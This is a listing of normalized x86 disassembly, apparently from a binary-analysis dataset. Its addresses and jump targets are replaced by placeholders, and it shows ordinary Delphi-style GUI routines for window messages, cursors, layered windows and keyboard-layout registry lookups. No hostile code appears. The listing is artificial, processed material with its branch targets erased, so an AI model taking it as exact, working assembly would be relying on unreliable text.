mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_4665d5
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_46629c
xor edx edx
push ebp
push sub_466534
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
push 0x0
push 0xb000
mov eax [ ebp - 0x4 ]
call sub_45071c
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x24c ] edx
push 0x0
push 0x0
push 0x1f
call GetCapture
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x8
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24c ] 0x2
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4661fc
call GetCapture
test eax eax
je r-xdata
mov eax [ rw-data ]
call sub_4695f8
mov eax [ rw-data ]
cmp [ eax + 0x9c ] 0x0
je r-xdata
mov [ ebp - 0x8 ] eax
push 0x0
push 0x0
push 0xb001
mov eax [ ebp - 0x4 ]
call sub_45071c
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
call sub_45071c
mov ebx eax
call GetActiveWindow
cmp ebx eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46653b
mov eax [ ebp - 0x4 ]
call sub_466294
retn
xor eax eax
mov [ ebp - 0x1c ] eax
sub_46653b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4665df
mov eax [ rw-data ]
mov eax [ eax + 0x48 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_46781c
mov dx [ ebp - 0x12 ]
mov eax [ rw-data ]
call sub_46781c
jmp r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x78 ] edx
mov eax ebx
call sub_4185a8
mov esi eax
mov eax [ rw-data ]
mov [ eax + 0x78 ] esi
mov edx esi
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
call sub_41874c
jmp r-xdata
mov eax [ ebp - 0xc ]
call sub_4607bc
mov eax [ rw-data ]
mov ebx [ eax + 0x7c ]
cmp [ ebx + 0x8 ] 0x0
jle r-xdata
mov eax [ ebp - 0x10 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xf7
retn
mov eax [ ebp - 0x1c ]
push eax
call SetActiveWindow
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_466624
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_44d44c
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_466624
pop ecx
mov eax ebx
mov edx [ eax ]
call [ edx + 0x78 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_44d410
mov ebx eax
test [ ebx + 0x51 ] 0x80
je r-xdata
sub_466694
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x78 ]
mov esi [ ebx + 0x248 ]
test esi esi
je r-xdata
push ebp
mov eax ebx
call sub_466624
pop ecx
mov eax [ esi + 0x34 ]
call sub_45bb60
dec eax
test eax eax
jl r-xdata
inc eax
mov esi eax
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ eax ]
call [ edx + 0x40 ]
mov eax [ ebx + 0x248 ]
mov eax [ eax + 0x34 ]
mov edx edi
call sub_45bb70
cmp [ eax + 0x3e ] 0x0
je r-xdata
sub_466718
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44ea6c
cmp [ esi + 0x4 ] 0x2f
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffd0
call sub_403350
sub_46673c
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x8 ]
mov eax ebx
mov si 0xfff3
call sub_403350
test al al
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov al 0x1
sub_46676c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_44d44c
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_46673c
pop ecx
test al al
jne r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_46676c
pop ecx
test al al
je r-xdata
mov al 0x1
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_44d410
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4667e8
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop ebx
pop ecx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebx + 0x220 ]
call sub_46673c
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x1
push ebp
mov eax ebx
call sub_46673c
pop ecx
test al al
jne r-xdata
push ebp
mov eax ebx
call sub_46676c
pop ecx
test al al
je r-xdata
sub_46683c
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x8 ]
mov eax ebx
mov si 0xfff0
call sub_403350
test al al
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov al 0x1
sub_46686c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_44d44c
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_46683c
pop ecx
test al al
jne r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_46686c
pop ecx
test al al
je r-xdata
mov al 0x1
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_44d410
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4668e8
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop ebx
pop ecx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebx + 0x220 ]
call sub_46683c
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x1
push ebp
mov eax ebx
call sub_46683c
pop ecx
test al al
jne r-xdata
push ebp
mov eax ebx
call sub_46686c
pop ecx
test al al
je r-xdata
sub_46693c
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2f0 ]
test eax eax
je r-xdata
xor eax eax
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2f0 ]
mov edx esi
call sub_4185b0
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
call sub_45619c
test al al
je r-xdata
pop esi
pop ebx
pop ebp
retn
sub_466990
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2c2 ] 0x0
je r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
lea ecx [ ebp - 0x9 ]
mov edx [ ebp - 0x8 ]
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x2c4 ]
call [ ebx + 0x2c0 ]
mov al 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x248 ]
test ebx ebx
je r-xdata
push ebp
call sub_46693c
pop ecx
test al al
jne r-xdata
cmp [ ebx + 0x38 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
mov si 0xffef
call sub_403350
test al al
jne r-xdata
mov [ ebp - 0x9 ] al
mov al [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_466a0c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ ebx + 0x250 ] 0x0
je r-xdata
push edi
push esi
push ebx
call sub_42175c
jmp r-xdata
push edi
push esi
mov eax [ ebx + 0x250 ]
push eax
mov eax [ eax ]
call [ eax ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
xor eax eax
sub_466a48
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0x224 ]
test edi edi
je r-xdata
mov edx esi
mov eax ebx
call sub_44a304
mov eax [ esi + 0x8 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx 0xb043
mov eax edi
call sub_44afd4
mov [ esi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_466a90
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax ebx
call sub_450a20
test al al
je r-xdata
push 0xffffffec
mov eax ebx
call sub_45071c
push eax
call GetWindowLongA
mov esi eax
cmp [ ebx + 0x2e0 ] 0x0
jne r-xdata
test esi 0x80000
jne r-xdata
cmp [ ebx + 0x2e8 ] 0x0
je r-xdata
xor eax eax
mov al [ ebx + 0x2e0 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x2e8 ]
or eax [ edx * 4 + rw-data ]
push eax
mov al [ ebx + 0x2e1 ]
push eax
mov eax [ ebx + 0x2ec ]
push eax
mov eax ebx
call sub_45071c
push eax
call [ rw-data ]
jmp r-xdata
or esi 0x80000
push esi
push 0xffffffec
mov eax ebx
call sub_45071c
push eax
call SetWindowLongA
and esi 0xfff7ffff
push esi
push 0xffffffec
mov eax ebx
call sub_45071c
push eax
call SetWindowLongA
push 0x485
push 0x0
push 0x0
mov eax ebx
call sub_45071c
push eax
call RedrawWindow
sub_466be4
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
push 0x0
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0xe0 ]
xor edx edx
mov eax ebx
call sub_461994
mov dl 0x5
mov eax ebx
call sub_463708
mov dl 0x1
mov eax ebx
call sub_44f2f8
mov dl 0x3
mov eax ebx
call sub_463a04
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_466c4c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_466d23
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_44f1b8
dec eax
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_44f024
mov dl 0x5
mov eax [ ebp - 0x4 ]
call sub_449334
test [ esi + 0x1c ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_449d94
mov ecx eax
inc ecx
lea eax [ ebp - 0xc ]
xor edx edx
call sub_404040
mov eax [ ebp - 0xc ]
call sub_404210
push eax
mov eax [ ebp - 0xc ]
call sub_404410
mov edx eax
mov eax [ ebp - 0x4 ]
pop ecx
call sub_449da4
mov eax [ ebp - 0xc ]
call sub_404210
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_466d2a
lea eax [ ebp - 0xc ]
call sub_403f50
retn
mov dl 0x1
mov eax esi
call sub_462d88
mov edx [ ebp - 0xc ]
mov eax esi
call sub_449e50
mov ebx 0x1
mov edx ebx
dec edx
lea eax [ ebp - 0xc ]
call sub_40459c
jmp r-xdata
sub dl 0x3
jne r-xdata
inc ebx
dec eax
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + ebx - 0x1 ]
sub dl 0xa
je r-xdata
sub_466d50
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_44d44c
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax ebx
call sub_4624ac
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
xor ebp ebp
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
push esp
mov edx ebp
mov eax ebx
call sub_44d410
mov edx ebx
pop ecx
mov si 0xffcc
call sub_403350
inc ebp
dec edi
jne r-xdata
sub_466d9c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov eax ebx
call sub_44f1b8
test eax eax
mov eax [ ebp + 0x8 ]
sete [ eax ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_466dc8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44f9c0
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0xc ] 0x1
jne r-xdata
mov [ esi + 0xc ] 0x2
sub_466df0
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x4 ] 0x2
jne r-xdata
mov edx esi
mov eax ebx
call sub_465158
cmp [ ebx + 0x9b ] 0x1
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_45071c
push eax
call IsIconic
test eax eax
jne r-xdata
mov eax ebx
call sub_44f1b8
test eax eax
jle r-xdata
push 0x7
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_45071c
push eax
call SetWindowPos
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
push 0xa2
mov eax ebx
call sub_45071c
push eax
call PostMessageA
cmp [ ebx + 0x22e ] 0x0
je r-xdata
pop esi
pop ebx
retn
xor edx edx
mov eax ebx
call sub_44f1cc
or ecx 0xffffffff
mov dl 0x1
call sub_44a4c8
pop esi
pop ebx
retn
sub_466e88
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_44fe30
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x4 ]
push eax
xor ecx ecx
mov edx 0xb039
mov eax esi
call sub_44afd4
mov edi [ ebx + 0x4 ]
cmp esi [ edi + 0xa0 ]
jne r-xdata
mov edx esp
mov eax edi
call sub_4497c0
mov ecx esp
mov eax edi
or edx 0xffffffff
mov si 0xffcc
call sub_403350
sub_466ee0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_466fa6
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
sub eax 0xc
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_449d94
mov ecx eax
inc ecx
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_404040
mov eax [ ebp - 0x4 ]
call sub_404210
push eax
mov eax [ ebp - 0x4 ]
call sub_404410
mov edx eax
mov eax [ ebx + 0x4 ]
pop ecx
call sub_449da4
mov eax [ ebp - 0x4 ]
call sub_404210
test eax eax
jle r-xdata
sub eax 0xafff
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_449e50
mov ebx 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_466fad
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
mov eax [ ebx + 0x4 ]
mov dl [ eax + 0x57 ]
mov eax esi
call sub_462d88
jmp r-xdata
mov edx ebx
dec edx
lea eax [ ebp - 0x4 ]
call sub_40459c
jmp r-xdata
sub dl 0x3
jne r-xdata
inc ebx
dec eax
jne r-xdata
mov edx [ ebp - 0x4 ]
mov dl [ edx + ebx - 0x1 ]
sub dl 0xa
je r-xdata
sub_466fcc
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_44fbb0
test [ ebx + 0x1c ] 0x8
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_44f1b8
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax ebx
call sub_44f1cc
mov dl [ ebx + 0x57 ]
call sub_449d40
inc edi
dec esi
jne r-xdata
sub_467070
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx edx
mov [ esp ] 0x28
push esp
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi ebx
lea esi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add esp 0x28
pop edi
pop esi
pop ebx
retn
sub_4670a0
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx edx
mov [ esp ] 0x28
push esp
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi ebx
lea esi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add esp 0x28
pop edi
pop esi
pop ebx
retn
sub_4670d0
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_420fcc
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_467474
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_467480
mov eax ebx
call sub_46748c
push 0x0
call GetKeyboardLayout
mov [ ebx + 0x3c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov [ ebx + 0x4c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov [ ebx + 0x54 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov [ ebx + 0x58 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov [ ebx + 0x7c ] eax
push 0x0
call GetDC
mov esi eax
push 0x5a
push esi
call GetDeviceCaps
mov [ ebx + 0x40 ] eax
push esi
push 0x0
call ReleaseDC
mov eax [ ebx + 0x58 ]
push eax
mov eax sub_4638a8
push eax
push 0x0
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_423e54
mov [ ebx + 0x84 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_423e54
mov [ ebx + 0x88 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_423e54
mov [ ebx + 0x80 ] eax
mov eax ebx
call sub_4678ac
mov eax [ ebx + 0x84 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_467788
mov eax [ ebx + 0x88 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_467788
mov eax [ ebx + 0x80 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_467788
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_467228
push ebx
push esi
push edi
push ebp
call sub_403508
mov ebx edx
mov ebp eax
mov eax [ ebp + 0x80 ]
call sub_403154
mov eax [ ebp + 0x88 ]
call sub_403154
mov eax [ ebp + 0x84 ]
call sub_403154
mov eax [ ebp + 0x54 ]
call sub_403154
mov eax [ ebp + 0x50 ]
call sub_403154
mov eax [ ebp + 0x4c ]
call sub_403154
mov eax [ ebp + 0x30 ]
call sub_403154
mov eax [ ebp + 0x34 ]
call sub_403154
mov eax [ ebp + 0x7c ]
call sub_403154
mov eax [ ebp + 0x58 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x58 ]
call sub_403154
mov eax ebp
call sub_4674e8
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov edx ebx
and dl 0xfc
mov eax ebp
call sub_421018
test bl bl
jle r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_4034f0
inc esi
xor edi edi
mov eax [ ebp + 0x58 ]
mov edx edi
call sub_4185b0
call sub_403154
inc edi
dec esi
jne r-xdata
sub_4673a0
push ebx
mov ebx eax
mov eax [ ebx + 0x68 ]
cmp eax [ ebx + 0x74 ]
je r-xdata
mov eax [ ebx + 0x64 ]
cmp eax [ ebx + 0x70 ]
je r-xdata
mov [ ebx + 0x74 ] eax
cmp [ ebx + 0x9a ] 0x0
je r-xdata
pop ebx
retn
mov [ ebx + 0x70 ] eax
cmp [ ebx + 0x92 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x9c ]
call [ ebx + 0x98 ]
mov edx ebx
mov eax [ ebx + 0x94 ]
call [ ebx + 0x90 ]
sub_4673ec
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_418454
mov eax esi
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_418454
mov eax [ rw-data ]
call sub_46a178
sub_467424
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_41874c
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_41874c
mov eax [ rw-data ]
call sub_46a178
mov eax [ ebx + 0x50 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax + 0x84 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x84 ]
call sub_451cb0
sub_46748c
push ebx
push esi
push edi
push ebp
mov ebp eax
push 0x7f00
push 0x0
call LoadCursorA
mov [ ebp + 0x60 ] eax
mov ebx 0xffffffea
mov esi rw-data
cmp ebx 0xffffffeb
jne r-xdata
cmp ebx 0xfffffff4
jle r-xdata
xor edi edi
mov edi [ rw-data ]
jmp r-xdata
cmp ebx 0xffffffef
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esi ]
push eax
push edi
call LoadCursorA
mov ecx eax
mov edx ebx
mov eax ebp
call sub_467544
inc ebx
add esi 0x4
cmp ebx 0xffffffff
jne r-xdata
sub_4674e8
push ebx
push esi
push edi
mov edi eax
mov ebx [ edi + 0x5c ]
test ebx ebx
je r-xdata
push 0x7f00
push 0x0
call LoadCursorA
mov edx [ edi + 0x60 ]
cmp eax edx
je r-xdata
mov eax [ ebx + 0x4 ]
cmp eax 0xffffffef
jl r-xdata
pop edi
pop esi
pop ebx
retn
push edx
call DestroyCursor
cmp eax 0xffffffeb
je r-xdata
cmp eax 0xfffffff4
jle r-xdata
mov eax [ ebx + 0x8 ]
push eax
call DestroyCursor
test eax eax
jle r-xdata
mov esi [ ebx ]
mov edx 0xc
mov eax ebx
call sub_4026fc
mov ebx esi
test ebx ebx
jne r-xdata
sub_467544
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax 0xc
call sub_4026dc
mov edx [ ebx + 0x5c ]
mov [ eax ] edx
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] edi
mov [ ebx + 0x5c ] eax
pop edi
pop esi
pop ebx
retn
sub_46756c
push ebp
mov ebp esp
add esp 0xfffffda0
push ebx
xor edx edx
mov [ ebp - 0x260 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_467717
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x34 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x34 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46771e
lea eax [ ebp - 0x260 ]
call sub_403f50
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov eax [ ebp - 0x4 ]
add eax 0x38
call sub_403f50
lea eax [ ebp - 0x114 ]
push eax
push 0x40
call GetKeyboardLayoutList
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x1d ] 0x0
mov dl 0x1
call sub_41aa14
inc eax
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x114 ]
mov [ ebp - 0x14 ] eax
add [ ebp - 0x14 ] 0x4
dec [ ebp - 0x10 ]
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
push 0x20019
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov [ ebp - 0x25c ] eax
mov [ ebp - 0x258 ] 0x0
lea ecx [ ebp - 0x25c ]
mov edx r-xdata
lea eax [ ebp - 0x254 ]
call sub_408d74
push eax
push 0x80000002
call RegOpenKeyExA
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
call sub_455458
test al al
je r-xdata
xor eax eax
push ebp
push sub_4676d3
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] 0x100
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x214 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call RegQueryValueExA
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call RegCloseKey
retn
lea eax [ ebp - 0x260 ]
lea edx [ ebp - 0x214 ]
mov ecx 0x100
call sub_4041c0
mov edx [ ebp - 0x260 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x3c ]
jne r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x38
lea edx [ ebp - 0x214 ]
mov ecx 0x100
call sub_4041c0
sub_467788
push ebx
push esi
mov esi edx
mov ebx eax
mov dx 0xb035
mov eax [ rw-data ]
call sub_469fe8
cmp esi [ ebx + 0x80 ]
jne r-xdata
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_469d9c
mov dl 0x1
mov eax [ rw-data ]
call sub_469d9c
sub_4677f4
xor ecx ecx
cmp edx 0xffffffff
je r-xdata
mov eax ecx
retn
mov ecx [ eax + 0x5c ]
jmp r-xdata
test ecx ecx
je r-xdata
